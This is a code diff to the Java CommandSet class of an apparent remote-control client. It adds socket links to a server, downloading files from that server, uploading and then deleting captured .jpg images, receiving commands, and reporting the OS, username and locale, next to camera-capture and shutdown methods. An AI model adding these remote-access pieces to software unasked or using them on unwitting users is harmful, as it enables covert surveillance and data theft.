@@ -14,8 +14,8 @@ import java.awt.datatransfer.Transferable;
 import java.awt.event.InputEvent;
 import java.awt.event.KeyEvent;
 import java.awt.image.BufferedImage;
-import java.io.File;
-import java.io.IOException;
+import java.io.*;
+import java.net.Socket;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -32,6 +32,13 @@ public abstract class CommandSet implements ClipboardOwner
     private String tempPath;
     /** provides lots of useful functions */
     private Robot robot;
+    /** output to the server */
+    private DataOutputStream outToServer;
+    /** input from the server */
+    private DataInputStream inFromServer;
+
+    private static final int MAJOR_VERSION = 0;
+    private static final int MINOR_VERSION = 3;
 
     public abstract void eject() throws IOException;
     public abstract void shutdown() throws IOException;
@@ -40,18 +47,26 @@ public abstract class CommandSet implements ClipboardOwner
     public abstract void takeCameraPicture();
     public abstract void setWallpaper(File wallpaper) throws IOException;
     public abstract void minimise();
+    public abstract void listProcesses() throws IOException;
 
-    public CommandSet()
+    public CommandSet(Socket connection)
     {
         createStorageDir();
         try
         {
             robot = new Robot();
+            inFromServer = new DataInputStream(connection.getInputStream());
+            outToServer = new DataOutputStream(connection.getOutputStream());
         }
         catch(AWTException awte)
         {
             System.err.println("Fatal error creating a robot");
             awte.printStackTrace();
+        }
+        catch(IOException ioe)
+        {
+            System.err.println("Something went wrong creating the output/input streams from the socket provided");
+            ioe.printStackTrace();
         }
     }
 
@@ -62,6 +77,125 @@ public abstract class CommandSet implements ClipboardOwner
     {
         tempPath = System.getProperty("java.io.tmpdir") + File.separator + "rc" + File.separator;
         new File(tempPath).mkdir();
+    }
+
+    /**
+     * retrieves a file sent from the server to us
+     * @param size the size of the file to retrieve in bytes
+     * @param prefix the prefix name the file should have
+     * @param suffix the suffix of the name of the file (must be a file extension to work with windows)
+     * @return the file retrieved from the server
+     * @throws IOException if something went wrong reading the file from the stream
+     */
+    public File getFileFromServer(int size, String prefix, String suffix) throws IOException
+    {
+        File fileFromServer = File.createTempFile(prefix, suffix, new File(tempPath));
+        byte[] buffer = new byte[size];
+
+        FileOutputStream fos = new FileOutputStream(fileFromServer);
+        System.out.println("Before readFully: File: " + fileFromServer.getName() + " with size: " + size);
+        inFromServer.readFully(buffer, 0, size);
+        fos.write(buffer, 0, size);
+        fos.flush();
+        System.out.println("After readFully: Size: " + fileFromServer.length());
+        fos.close();
+
+        System.out.println("Done file transfer");
+        return fileFromServer;
+    }
+
+    /**
+     * for sending data on the clients machine back to the server. e.g. screenshots
+     * @param toSend the file that needs to be sent
+     * @throws IOException if something went wrong sending the file
+     */
+    public void sendFile(File toSend) throws IOException
+    {
+        byte[] buffer = new byte[(int)toSend.length()];
+        InputStream sendMe = new FileInputStream(toSend);
+
+        outToServer.writeInt((int) toSend.length());
+        int count;
+        int sentBytes = 0;
+        while(sentBytes != toSend.length() && (count = sendMe.read(buffer)) > 0)
+        {
+            sentBytes += count;
+            outToServer.write(buffer, 0, count);
+        }
+
+        outToServer.flush();
+        sendMe.close();
+    }
+
+    public void sendAllImages() //todo: refactor
+    {
+        File[] allImages = new File(tempPath).listFiles();
+
+        try
+        {
+            int numOfImages = 0;
+            for(File file : allImages)
+            {
+                if(file.getName().endsWith(".jpg"))
+                    numOfImages++;
+            }
+            outToServer.writeInt(numOfImages);
+        }
+        catch(IOException ioe)
+        {
+            System.err.println("Failed creating connection to server to send files");
+        }
+
+        for(File file : allImages)
+        {
+            if(file.getName().endsWith(".jpg"))
+            {
+                try
+                {
+                    sendFile(file);
+                    file.delete();
+                }
+                catch(IOException ioe)
+                {
+                    ioe.printStackTrace();
+                }
+            }
+        }
+    }
+
+    /**
+     * gets the command string sent from the server
+     * @return the command the server sent, null if something went wrong reading the stream
+     */
+    public String getCommandFromServer()
+    {
+        String serverCommand = null;
+        try
+        {
+            int commandLength = inFromServer.readInt();
+            byte[] commandBytes = new byte[commandLength];
+            inFromServer.readFully(commandBytes, 0, commandLength);
+            serverCommand = new String(commandBytes);
+        }
+        catch(IOException ioe)
+        {
+            System.err.println("Something went wrong reading the command from the server");
+            ioe.printStackTrace();
+        }
+
+        return serverCommand;
+    }
+
+    /**
+     * sends this clients os info to the server, including the os name, jre arch, java version,
+     * language, country, username and desktop variant
+     * @throws IOException if something went wrong writing to the server
+     */
+    public void sendOSInfo() throws IOException
+    {
+        String os = "OS       : " + System.getProperty("os.name") + "\nJRE arch : " + System.getProperty("os.arch") + "\nJava     : " + System.getProperty("java.version") + "\nClient   : " + MAJOR_VERSION + "." + MINOR_VERSION + "\nUsername : " + System.getProperty("user.name") + "\nLanguage : " + System.getProperty("user.language") + "\nCountry  : " + System.getProperty("user.country") + "\nDesktop  : " + System.getProperty("sun.desktop");
+        outToServer.writeInt(os.length());
+        outToServer.write(os.getBytes(), 0, os.length());
     }
 
     public void retrieve()
